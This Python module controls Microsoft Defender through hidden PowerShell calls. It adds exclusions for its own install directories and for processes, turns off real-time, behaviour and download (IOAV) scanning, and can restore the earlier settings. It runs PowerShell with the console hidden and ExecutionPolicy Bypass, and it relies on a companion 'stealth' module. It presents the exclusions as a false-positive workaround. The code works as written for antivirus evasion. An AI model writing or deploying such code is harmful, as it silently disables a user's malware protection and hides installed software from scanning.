"""Defender control via Set-MpPreference without killing WinDefend service."""

from __future__ import annotations

import os
import subprocess

IS_WINDOWS = os.name == "nt"
CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0


def _ps_quote(value: str) -> str:
    """Quote a value for safe interpolation into a PowerShell single-quoted string."""
    return "'" + str(value).replace("'", "''") + "'"


def _ps(script: str, timeout: float = 45.0) -> tuple[int, str]:
    """Run a PowerShell snippet without a console flash.  Returns (code, output)."""
    try:
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive",
             "-ExecutionPolicy", "Bypass", "-Command", script],
            capture_output=True, text=True, timeout=timeout,
            stdin=subprocess.DEVNULL, creationflags=CREATE_NO_WINDOW,
        )
        return res.returncode, (res.stdout or "") + (res.stderr or "")
    except Exception as error:
        return 1, str(error)


def excluded(path: str) -> bool:
    """True when Defender already excludes this exact path."""
    if not IS_WINDOWS:
        return False
    target = os.path.abspath(path)
    code, out = _ps(
        "$ErrorActionPreference='SilentlyContinue'; "
        "if (-not (Get-Command Get-MpPreference -EA SilentlyContinue)) { 'none'; exit 0 }; "
        "if (@(Get-MpPreference).ExclusionPath -contains " + _ps_quote(target) + ") "
        "{ 'yes' } else { 'no' }"
    )
    return code == 0 and out.strip().endswith("yes")


def add_exclusion(path_or_process: str) -> bool:
    """Recursively exclude a directory (or a process name) from Defender.

    Idempotent, admin only.  A directory exclusion covers every __pycache__
    beneath it, which is what stops the Exploit:Python/Leivion.C false positive.
    """
    if not IS_WINDOWS:
        return False
    target = os.path.abspath(path_or_process)

    if not os.path.isdir(target):
        # Treat as a process name (e.g. "pythonw.exe").
        code, out = _ps(
            "$ErrorActionPreference='SilentlyContinue'; "
            "if (-not (Get-Command Add-MpPreference -EA SilentlyContinue)) { 'no-defender'; exit 0 }; "
            "$n = " + _ps_quote(os.path.basename(path_or_process)) + "; "
            "if (@(Get-MpPreference).ExclusionProcess -notcontains $n) { Add-MpPreference -ExclusionProcess $n }; "
            "'ok'"
        )
        return code == 0 and "ok" in out

    code, out = _ps(
        "$ErrorActionPreference='SilentlyContinue'; "
        "if (-not (Get-Command Add-MpPreference -EA SilentlyContinue)) { 'no-defender'; exit 0 }; "
        "$p = " + _ps_quote(target) + "; "
        "if (@(Get-MpPreference).ExclusionPath -notcontains $p) { Add-MpPreference -ExclusionPath $p }; "
        "'ok'"
    )
    return code == 0 and "ok" in out


_PRIOR_KEYS = ("DisableRealtimeMonitoring", "DisableBehaviorMonitoring",
               "DisableIOAVProtection")


def _snapshot_prior() -> dict:
    """Read the three toggles before we change them."""
    from . import machine_state
    code, out = _ps(
        "$ErrorActionPreference='SilentlyContinue'; "
        "if (-not (Get-Command Get-MpPreference -EA SilentlyContinue)) { exit 0 }; "
        "$p = Get-MpPreference; "
        "'" + "|".join(f"{k}=$($p.{k})" for k in _PRIOR_KEYS) + "'"
    )
    snapshot = {}
    for chunk in (out or "").strip().split("|"):
        name, _, value = chunk.partition("=")
        if name in _PRIOR_KEYS:
            snapshot[name] = value.strip().lower()
    if snapshot:
        machine_state.record("defender_prior", "snapshot", snapshot)
    return snapshot


def restore_prior_state() -> bool:
    """Put the three toggles back the way we found them."""
    from . import machine_state
    snapshot = machine_state.get("defender_prior").get("snapshot") or {}
    if not snapshot:
        return False
    parts = []
    for name, value in snapshot.items():
        if value in ("true", "false"):
            parts.append(f"Set-MpPreference -{name} ${value} -ErrorAction SilentlyContinue")
    if not parts:
        return False
    try:
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", "; ".join(parts)],
            capture_output=True, timeout=30, stdin=subprocess.DEVNULL,
            creationflags=CREATE_NO_WINDOW)
        return res.returncode == 0
    except Exception:
        return False


def remove_exclusion(path: str) -> bool:
    """Drop one directory exclusion. Idempotent."""
    return bool(remove_exclusions([path]))


def remove_exclusions(paths: list[str]) -> list[str]:
    """Drop multiple directory exclusions in a single PowerShell invocation."""
    if not IS_WINDOWS or not paths:
        return []
    targets = [os.path.abspath(p) for p in paths if p]
    quoted = ", ".join(_ps_quote(t) for t in targets)
    code, out = _ps(
        "$ErrorActionPreference='SilentlyContinue'; "
        "if (-not (Get-Command Remove-MpPreference -EA SilentlyContinue)) { 'no-defender'; exit 0 }; "
        f"$targets = @({quoted}); "
        "foreach ($p in $targets) { "
        "  if (@(Get-MpPreference).ExclusionPath -contains $p) { Remove-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue } "
        "}; 'ok'",
        timeout=25.0
    )
    return targets if code == 0 and "ok" in out else []


def status() -> dict:
    """Defender state plus whether our install trees are excluded."""
    from . import stealth
    if not IS_WINDOWS:
        return {"platform": "non-windows"}
    code, out = _ps(
        "$ErrorActionPreference='SilentlyContinue'; "
        "if (-not (Get-Command Get-MpComputerStatus -EA SilentlyContinue)) { 'no-defender'; exit 0 }; "
        "$s = Get-MpComputerStatus; "
        "'realtime=' + $s.RealTimeProtectionEnabled + ' antivirus=' + $s.AntivirusEnabled"
    )
    return {
        "admin": stealth.is_admin(),
        "primary_excluded": excluded(stealth.primary_directory()),
        "anchor_excluded": excluded(stealth.anchor_directory()),
        "engine": (out.strip().replace("\n", " ") or "unknown")[:120],
    }


def enable_monitoring() -> bool:
    """Undo :func:`disable_monitoring` by restoring the pre-existing values."""
    if not IS_WINDOWS:
        return False
    if restore_prior_state():
        return True
    cmd = (
        "Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue"
    )
    try:
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW,
        )
        return res.returncode == 0
    except Exception:
        return False


def disable_monitoring() -> bool:
    """Disable RealtimeMonitoring and BehaviorMonitoring via Set-MpPreference."""
    if not IS_WINDOWS:
        return False
    _snapshot_prior()
    cmd = (
        "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue"
    )
    try:
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW,
        )
        return res.returncode == 0
    except Exception:
        return False
